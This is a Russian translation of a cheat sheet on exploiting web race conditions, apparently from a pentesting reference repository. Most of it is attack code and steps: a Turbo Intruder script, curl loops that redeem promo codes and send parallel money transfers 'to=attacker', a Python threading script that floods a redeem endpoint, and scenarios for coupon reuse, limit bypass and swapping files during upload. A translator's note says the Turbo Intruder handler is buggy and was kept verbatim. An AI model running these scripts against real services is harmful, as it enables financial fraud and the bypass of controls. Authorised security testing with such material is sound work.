<a id="-race-conditions-cheatsheet"></a>
# ⚡ Справочник по состояниям гонки

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

> **Уточнения к оригиналу.** В [официальном примере Turbo Intruder](https://raw.githubusercontent.com/PortSwigger/turbo-intruder/master/resources/examples/basic.py) callback имеет вид `handleResponse(req, interesting)`: статус находится в `req.status`, а в таблицу передаётся `req`. Поэтому обработчик ниже содержит ошибку; исходный код сохранён дословно. Параллельные соединения и последовательный запуск потоков не гарантируют одновременного прибытия запросов. [PortSwigger](https://portswigger.net/web-security/race-conditions) описывает отдельные способы синхронизации; успешный HTTP-ответ сам по себе не доказывает обход ограничения. Показанные последствия зависят от логики приложения, а подмена файла возможна лишь при доступе к нему в нужный момент.

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

<a id="-what-are-race-conditions"></a>
## 🎯 Что такое состояния гонки

**Состояния гонки (race conditions)** возникают, когда результат операций зависит от их взаимного порядка и времени выполнения. Уязвимость может позволить использовать промежуток между проверкой условия и использованием ресурса (check-then-use).

<a id="impact"></a>
### Последствия
- 💰 **Финансовое мошенничество** — многократное использование одноразового предложения
- 🎫 **Злоупотребление купонами** — повторное применение одного кода
- 👤 **Повышение привилегий** — обход проверок
- 📂 **Перезапись файлов** — атаки TOCTOU (между проверкой и использованием)

---

<a id="-common-targets"></a>
## 🔍 Типичные цели

```
- Применение купонов и промокодов
- Системы голосования и отметок «нравится»
- Денежные переводы
- Операции с ограничением числа выполнений
- Загрузка файлов на сервер
- Сброс пароля
- Проверка двухфакторной аутентификации (2FA)
- Регистрация учётных записей
```

---

<a id="-exploitation-techniques"></a>
## 💉 Способы эксплуатации

<a id="burp-suite-turbo-intruder"></a>
### Burp Suite Turbo Intruder

```python
# Отправить несколько одинаковых запросов параллельно
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

<a id="burp-repeater-manual"></a>
### Burp Repeater (вручную)
```
1. Отправить запрос в Repeater
2. Создать 20+ копий вкладки
3. Объединить вкладки в группу
4. Нажать "Send group (parallel)" (отправить группу параллельно)
```

<a id="curl-parallel"></a>
### Параллельные запросы curl
```bash
# Отправить 20 параллельных запросов
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# С данными POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

<a id="python-threading"></a>
### Потоки Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Запустить все потоки подряд (синхронное прибытие не гарантируется)
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

<a id="-common-scenarios"></a>
## 📊 Типичные сценарии

<a id="coupon-code-race"></a>
### Гонка при применении промокода
```
1. Купон = скидка 50%
2. В норме: применить один раз
3. Гонка: применить 10x одновременно
4. Результат: 10 заказов со скидкой 50%
```

<a id="limit-bypass"></a>
### Обход ограничений
```
1. Ограничение: 3 загрузки в день
2. Гонка: запросить 10 загрузок одновременно
3. Проверки выполняются одновременно
4. Результат: все 10 загрузок проходят до срабатывания ограничения
```

<a id="file-upload-race-toctou"></a>
### Гонка при загрузке файла (TOCTOU)
```
1. Загрузить файл → файл проходит проверку безопасности
2. До перемещения заменить его вредоносным файлом
3. Сервер перемещает подменённый файл
```

---

<a id="-tools"></a>
## 🛠️ Инструменты

| Инструмент | Назначение |
|------|---------|
| **Turbo Intruder** | Расширение Burp для параллельных запросов |
| **race-the-web** | Инструмент на Go для проверки состояний гонки |
| **racepwn** | Инструмент на Python для проверки состояний гонки |

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Состояния гонки: PortSwigger](https://portswigger.net/web-security/race-conditions)
- [TOCTOU: OWASP](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Используйте ошибки синхронизации!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
